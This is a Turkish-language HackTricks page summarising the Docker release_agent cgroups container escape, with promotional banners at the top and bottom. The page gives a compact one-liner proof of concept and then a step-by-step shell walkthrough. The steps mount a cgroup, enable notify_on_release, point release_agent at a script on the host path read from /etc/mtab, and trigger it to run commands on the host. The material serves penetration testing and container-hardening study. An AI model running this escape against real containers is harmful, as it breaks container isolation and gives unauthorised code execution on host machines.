# Docker release_agent cgroups kaçışı

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


**Daha fazla ayrıntı için, [orijinal blog yazısına](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) başvurun.** Bu sadece bir özet:

Orijinal PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
**Kavramın Kanıtı (PoC)**, cgroups'ı sömürmek için bir yöntemi gösterir. Bu yöntemde, `release_agent` dosyası oluşturulur ve çağrısı tetiklenerek konteyner ana bilgisayarında keyfi komutlar çalıştırılır. İşte adımların ayrıntılı açıklaması:

1. **Ortamı Hazırlama:**
- `cgroup` için bir bağlama noktası olarak kullanılmak üzere `/tmp/cgrp` adlı bir dizin oluşturulur.
- RDMA cgroup denetleyicisi bu dizine bağlanır. RDMA denetleyicisi bulunmaması durumunda, alternatif olarak `memory` cgroup denetleyicisi kullanılması önerilir.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Çocuk Cgroup'u Kurulumu:**
- Bağlanmış cgroup dizini içinde "x" adında bir çocuk cgroup oluşturulur.
- "x" cgroup için bildirimler, notify_on_release dosyasına 1 yazılarak etkinleştirilir.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Yayın Ajanını Yapılandırın:**
- Konteynerin ana bilgisayardaki yolu /etc/mtab dosyasından elde edilir.
- Ardından cgroup'ın release_agent dosyası, elde edilen ana bilgisayar yolunda bulunan /cmd adlı bir betiği çalıştırmak üzere yapılandırılır.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd Betiği Oluştur ve Yapılandır:**
- /cmd betiği, konteyner içinde oluşturulur ve ps aux komutunu çalıştırmak üzere yapılandırılır, çıktıyı konteyner içinde /output adlı bir dosyaya yönlendirir. Ana bilgisayardaki /output dosyasının tam yolu belirtilir.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Saldırıyı Tetikle:**
- "x" çocuk cgroup içinde bir işlem başlatılır ve hemen sonlandırılır.
- Bu, `release_agent`'ı (the /cmd script) tetikler, bu da ana makinede ps aux komutunu çalıştırır ve çıktıyı konteyner içindeki /output'a yazar.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
